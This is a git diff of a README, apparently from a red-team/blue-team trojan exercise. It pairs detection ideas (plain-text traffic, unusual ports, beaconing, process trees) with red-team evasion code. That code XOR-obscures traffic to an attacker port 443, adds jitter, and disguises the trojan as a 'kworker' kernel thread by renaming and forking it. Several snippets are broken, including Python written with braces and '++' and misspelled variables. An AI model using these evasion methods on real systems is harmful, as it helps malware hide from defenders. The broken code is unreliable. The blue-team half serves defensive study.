@@ -7,20 +7,22 @@ BLUE TEAM:
 
 2. Network Intrusion Detection System - NIDS
    Using tools like `Wiershark` we can easily see the plain text sent over the network, like "rs is ready" or even the bash scripts in the reverse shell. In addition if we use ports like `port: 4444` which is not a standart port for a server, it can be a sign of an intrusion, we send a RST signal, and the connection is severed.
+   Another problem is that the `Trojan` is checking in ever x seconds, meaning there is a pattern, and if the server is running a diagnostic program it can detect it as a threat.
 
    Problems:
     - Plain text
     - Unusual ports
+    - Beacon Patterns
 
    <img width="458" height="383" alt="image" src="https://github.com/user-attachments/assets/10f79aac-72f4-4c2b-82ef-84246724183e" />
 
 3. Process analisys
    Using commands like `pstree` or `ps aux --forest` we can see the tree of each process. Meaning - we can see each process and his children, like:
 ```
-   root      1082  0.0  0.1  /usr/sbin/sshd
-   user      1402  0.0  0.1   \_ -bash
+   root      1082  0.0  0.1  /usr/sbin/sshd      <-- suspicious dir
+   user      1402  0.0  0.1   \_ -bash            <-- user-initiated terminal
    user      4444  0.0  0.0       \_ ./Trojan      <-- suspicious name
-   root      4445  0.0  0.0           \_ /bin/bash  <-- suspicious child
+   root      4445  0.0  0.0           \_ /bin/bash
 ```
    
    
@@ -57,18 +59,71 @@ RED TEAM:
     execve(shell_cmd, ...);
 ```
 
-2. The solution yet again it an encryption before we send the data, and of course decryption upon recieving. The quickest way it to use encryption like XOR above.
+``` Python
+   def encrypt(msg){
+      encrypted = ""
+      counter = 0
+      for c in msg:
+         encrypted[counter] = c^0x42
+```
+
+
+2. The solution yet again it an encryption before we send the data, and of course decryption upon recieving. The quickest way it to use encryption like XOR above. and for the pattern - we use a randomizer function with a jitter factor. for the port problem we use a common `http` port, which (if we play it right) will be treated as an system update request.
 
    solution:
     - Encryption (like SSL/TSL or even XOR) 
     - Common ports like 80/443 on the target
+    - Jitter
 
 ``` C
+void safeSend(int connID, char *msg){
+   char encrypted[1024];
+   strcpy(encrypted, msg);
 
+   for(int i=0; i<strlen(encrypted); i++){
+      encrypted[i] ^= 0x42;
+   }
+   send(connID, encrypted, strlen(encrypted), 0);
+}
 ```
+
 ``` Python
 ATTACKER_PORT = 443
+
+def safeRecv(msg):
+   decrypted = ""
+   counter =0;
+   for c in msg:
+      decrypten[counter] = c^0x42
+      counter++
+   return decrypted
 ```
+
+3. To solve this we will do 2 things
+   - use `Argv overwrite` and mask the real process name.
+   - add a child (that will run the whole programm) and kill the parent, so we get rid of the suspicious ancestory.
+   - rename the Thread so it wont show up on the `top` or `htop` process table.
+
+``` C
+#include <sys/prctl.h>
+
+void mask_process(int argc, char *argv[]) {
+
+    prctl(PR_SET_NAME, "kworker/u4:1", 0, 0, 0);
+
+    memset(argv[0], 0, strlen(argv[0]));
+    strcpy(argv[0], "kworker/u4:1"); 
+}
+
+int main(int argc, char *argv[]) {
+    mask_process(argc, argv);
+    
+    if(fork() != 0) return 0;
+    
+    // ... rest of your code ...
+}
+```
+
 
 
    
